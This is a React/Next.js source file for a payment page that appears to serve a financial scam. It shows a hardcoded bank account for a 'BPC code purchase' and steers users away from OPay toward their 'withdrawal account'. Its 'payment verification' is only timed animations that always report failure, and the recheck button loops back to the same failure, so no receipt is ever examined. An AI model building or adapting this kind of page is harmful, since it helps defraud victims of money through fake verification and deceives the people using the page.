"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { ArrowLeft, Copy, Upload, X } from "lucide-react"
import { useRouter } from "next/navigation"
import Image from "next/image"

export default function PaymentPage() {
  const router = useRouter()
  const [showLoading, setShowLoading] = useState(true)
  const [showOpayWarning, setShowOpayWarning] = useState(false)
  const [showAccountDetails, setShowAccountDetails] = useState(false)
  const [showPaymentCheck, setShowPaymentCheck] = useState(false)
  const [showPaymentResult, setShowPaymentResult] = useState(false)
  const [uploadedReceipt, setUploadedReceipt] = useState<File | null>(null)
  const [receiptPreview, setReceiptPreview] = useState<string | null>(null)
  const [showReconfirmLoading, setShowReconfirmLoading] = useState(false)
  const [userData, setUserData] = useState({ fullName: "", email: "", amount: "" })

  useEffect(() => {
    const storedUserData = JSON.parse(localStorage.getItem("userData") || "{}")
    const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}")
    setUserData({
      fullName: storedUserData.fullName || "User",
      email: storedUserData.email || "user@example.com",
      amount: paymentData.amount || "8,500.00",
    })

    const timer = setTimeout(() => {
      setShowLoading(false)
      setShowOpayWarning(true)
    }, 5000)

    return () => clearTimeout(timer)
  }, [])

  const handleOpayWarningAccept = () => {
    setShowOpayWarning(false)
    setShowAccountDetails(true)
  }

  const handleReceiptUpload = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0]
    if (file) {
      setUploadedReceipt(file)
      const reader = new FileReader()
      reader.onload = (e) => {
        setReceiptPreview(e.target?.result as string)
      }
      reader.readAsDataURL(file)
    }
  }

  const removeReceipt = () => {
    setUploadedReceipt(null)
    setReceiptPreview(null)
  }

  const handlePaymentMade = () => {
    setShowAccountDetails(false)
    setShowPaymentCheck(true)

    setTimeout(() => {
      setShowPaymentCheck(false)
      setShowPaymentResult(true)
    }, 6000)
  }

  const handleReconfirm = () => {
    setShowPaymentResult(false)
    setShowReconfirmLoading(true)

    setTimeout(() => {
      setShowReconfirmLoading(false)
      setShowPaymentResult(true)
    }, 7000)
  }

  const copyAccountNumber = () => {
    navigator.clipboard.writeText("6711230988")
  }

  return (
    <div className="min-h-screen" style={{ backgroundColor: "#0000FF" }}>
      {/* Header */}
      <div className="flex items-center p-4 pt-12">
        <button onClick={() => router.back()} className="mr-4">
          <ArrowLeft className="text-white" size={20} />
        </button>
        <h1 className="text-white text-xl font-bold">Payment Details</h1>
      </div>

      <div className="flex items-center justify-center min-h-[80vh] p-4">
        {showLoading && (
          <div className="text-center">
            <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-white mx-auto mb-4"></div>
            <p className="text-white text-lg">Loading payment details...</p>
          </div>
        )}

        {showOpayWarning && (
          <div className="bg-white rounded-lg p-4 w-full max-w-md">
            <div className="text-center mb-6">
              <div className="flex justify-center mb-4">
                <Image src="/images/opay-logo.png" alt="OPay Logo" width={80} height={80} className="rounded-lg" />
              </div>
              <h2 className="text-xl font-bold text-red-600 mb-4">⚠️ Important Notice</h2>
              <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-4">
                <p className="text-red-800 font-semibold text-lg mb-2">
                  We are NOT accepting payments from OPay accounts
                </p>
                <p className="text-red-700 text-sm">
                  Please use other bank accounts like GTBank, Access Bank, First Bank, UBA, Zenith Bank, or other
                  traditional banks for your BPC code purchase. OPay transactions cannot be processed by our payment
                  system.
                </p>
              </div>
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-4">
                <p className="text-blue-800 text-sm">
                  💡 <strong>Tip:</strong> Use your withdrawal account for faster payment verification and seamless
                  transaction processing.
                </p>
              </div>
            </div>

            <button
              onClick={handleOpayWarningAccept}
              className="w-full text-white py-3 rounded-lg font-semibold"
              style={{ backgroundColor: "#0000FF" }}
            >
              I WON'T USE OPAY
            </button>
          </div>
        )}

        {showAccountDetails && (
          <div className="bg-white rounded-lg p-4 w-full max-w-md">
            <h2 className="text-xl font-bold text-center mb-6 text-gray-800">Account Details</h2>

            <div className="space-y-4 mb-6">
              <div>
                <label className="block text-gray-600 text-sm font-medium mb-1">Bank:</label>
                <p className="text-gray-800 font-semibold">MONIEPOINT MFB</p>
              </div>

              <div>
                <label className="block text-gray-600 text-sm font-medium mb-1">Account Number:</label>
                <div className="flex items-center justify-between bg-gray-50 p-3 rounded-lg">
                  <p className="text-gray-800 font-semibold">6711230988</p>
                  <button onClick={copyAccountNumber} className="text-blue-600 hover:text-blue-800">
                    <Copy size={20} />
                  </button>
                </div>
              </div>

              <div>
                <label className="block text-gray-600 text-sm font-medium mb-1">Name:</label>
                <p className="text-gray-800 font-semibold">MOD... CH... AGB (BLUEPAY2026 Agent)</p>
              </div>
            </div>

            <div className="mb-6">
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-2 mb-3 overflow-hidden">
                <div className="animate-marquee whitespace-nowrap text-blue-800 text-xs font-medium">
                  📄 Upload your payment receipt for faster verification and easier payment checking by our automated
                  system
                </div>
              </div>

              <label className="block text-gray-600 text-sm font-medium mb-2">Upload Payment Receipt (Optional)</label>

              {!uploadedReceipt ? (
                <div className="border-2 border-dashed border-gray-300 rounded-lg p-4 text-center">
                  <input
                    type="file"
                    accept="image/*,.pdf"
                    onChange={handleReceiptUpload}
                    className="hidden"
                    id="receipt-upload"
                  />
                  <label htmlFor="receipt-upload" className="cursor-pointer">
                    <Upload className="mx-auto mb-2 text-gray-400" size={20} />
                    <p className="text-gray-600 text-sm">Click to upload receipt</p>
                    <p className="text-gray-400 text-xs mt-1">PNG, JPG or PDF</p>
                  </label>
                </div>
              ) : (
                <div className="bg-gray-50 rounded-lg p-3">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center">
                      <Upload className="text-green-600 mr-2" size={20} />
                      <span className="text-sm text-gray-700 truncate">{uploadedReceipt.name}</span>
                    </div>
                    <button onClick={removeReceipt} className="text-red-500 hover:text-red-700">
                      <X size={16} />
                    </button>
                  </div>
                  {receiptPreview && uploadedReceipt.type.startsWith("image/") && (
                    <img
                      src={receiptPreview || "/placeholder.svg"}
                      alt="Receipt preview"
                      className="mt-2 max-h-32 rounded"
                    />
                  )}
                </div>
              )}
            </div>

            <button
              onClick={handlePaymentMade}
              className="w-full text-white py-3 rounded-lg font-semibold"
              style={{ backgroundColor: "#0000FF" }}
            >
              I've made payment
            </button>
          </div>
        )}

        {showPaymentCheck && (
          <div className="bg-white rounded-xl p-5 w-full max-w-lg shadow-2xl">
            <div className="text-center mb-6">
              <div className="relative">
                <div className="w-20 h-20 mx-auto mb-4 bg-gradient-to-r from-blue-500 to-purple-600 rounded-full flex items-center justify-center">
                  <div className="animate-spin rounded-full h-12 w-12 border-4 border-white border-t-transparent"></div>
                </div>
                <div className="absolute -top-2 -right-2 w-6 h-6 bg-green-500 rounded-full animate-pulse"></div>
              </div>

              <h2 className="text-xl font-bold text-gray-800 mb-4">Verifying Payment</h2>

              {/* User Details Display */}
              <div className="bg-gradient-to-r from-blue-50 to-purple-50 rounded-xl p-4 mb-6 border border-blue-200">
                <div className="space-y-2 text-left">
                  <div className="flex justify-between items-center">
                    <span className="text-gray-600 font-medium">Name:</span>
                    <span className="text-gray-800 font-semibold">{userData.fullName}</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-gray-600 font-medium">Email:</span>
                    <span className="text-gray-800 font-semibold text-sm">{userData.email}</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-gray-600 font-medium">Amount:</span>
                    <span className="text-green-600 font-bold text-lg">₦{userData.amount}</span>
                  </div>
                </div>
              </div>

              {/* Verification Messages */}
              <div className="space-y-3">
                <div className="flex items-center justify-center gap-3 text-blue-600">
                  <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce"></div>
                  <p className="font-semibold">Hold on, let me check and verify your payment receipts</p>
                </div>

                {uploadedReceipt && (
                  <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
                    <div className="flex items-center justify-center gap-2 text-yellow-700">
                      <Upload size={16} />
                      <p className="text-sm font-medium">Analyzing uploaded receipt: {uploadedReceipt.name}</p>
                    </div>
                  </div>
                )}

                <div className="text-gray-600 text-sm">
                  <p>I'm just checking your payment receipts to know if you have made payment</p>
                </div>

                {/* Animated Progress Dots */}
                <div className="flex justify-center gap-1 mt-4">
                  <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce"></div>
                  <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce delay-100"></div>
                  <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce delay-200"></div>
                </div>
              </div>
            </div>
          </div>
        )}

        {showReconfirmLoading && (
          <div className="text-center">
            <div className="animate-spin rounded-full h-16 w-16 border-b-2 border-white mx-auto mb-4"></div>
            <p className="text-white text-lg">Rechecking your payment...</p>
            <p className="text-white text-sm mt-2">Please wait while we verify again</p>
          </div>
        )}

        {showPaymentResult && (
          <div className="bg-white rounded-xl p-5 w-full max-w-lg shadow-2xl">
            <div className="text-center">
              {/* Animated Error Icon */}
              <div className="relative mb-6">
                <div className="w-24 h-24 mx-auto bg-gradient-to-r from-red-500 to-pink-500 rounded-full flex items-center justify-center shadow-lg">
                  <div className="text-xl text-white animate-pulse">🚫</div>
                </div>
                <div className="absolute -bottom-2 left-1/2 transform -translate-x-1/2 bg-red-100 px-3 py-1 rounded-full">
                  <span className="text-red-600 text-xs font-semibold">FAILED</span>
                </div>
              </div>

              <h2 className="text-xl font-bold text-red-600 mb-3">Payment Not Confirmed</h2>

              {/* User Details in Error State */}
              <div className="bg-red-50 border border-red-200 rounded-xl p-4 mb-6">
                <div className="space-y-2 text-left">
                  <div className="flex justify-between items-center">
                    <span className="text-red-600 font-medium">Name:</span>
                    <span className="text-red-800 font-semibold">{userData.fullName}</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-red-600 font-medium">Email:</span>
                    <span className="text-red-800 font-semibold text-sm">{userData.email}</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-red-600 font-medium">Amount:</span>
                    <span className="text-red-700 font-bold text-lg">₦{userData.amount}</span>
                  </div>
                </div>
              </div>

              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4 mb-6">
                <p className="text-yellow-800 text-sm font-medium mb-2">⚠️ Payment Verification Failed</p>
                <p className="text-yellow-700 text-xs">
                  We couldn't verify your payment at this time. Please ensure you've sent the exact amount to the
                  correct account details.
                </p>
              </div>

              <div className="space-y-3">
                <button
                  onClick={handleReconfirm}
                  className="w-full bg-gradient-to-r from-orange-500 to-yellow-500 text-white py-4 rounded-xl font-bold text-lg shadow-lg hover:shadow-xl transform hover:scale-105 transition-all duration-200"
                >
                  🔄 RECHECK PAYMENT
                </button>

                <button
                  onClick={() => router.push("/dashboard")}
                  className="w-full text-white py-4 rounded-xl font-bold text-lg shadow-lg hover:shadow-xl transform hover:scale-105 transition-all duration-200"
                  style={{ background: "linear-gradient(135deg, #0000FF 0%, #8A2BE2 100%)" }}
                >
                  🏠 Back to Dashboard
                </button>
              </div>

              <p className="text-gray-500 text-xs mt-4">
                Need help? Contact our support team for assistance with your payment.
              </p>
            </div>
          </div>
        )}
      </div>

      <style jsx>{`
        @keyframes marquee {
          0% { transform: translateX(100%); }
          100% { transform: translateX(-100%); }
        }
        .animate-marquee {
          animation: marquee 25s linear infinite;
        }
      `}</style>
    </div>
  )
}
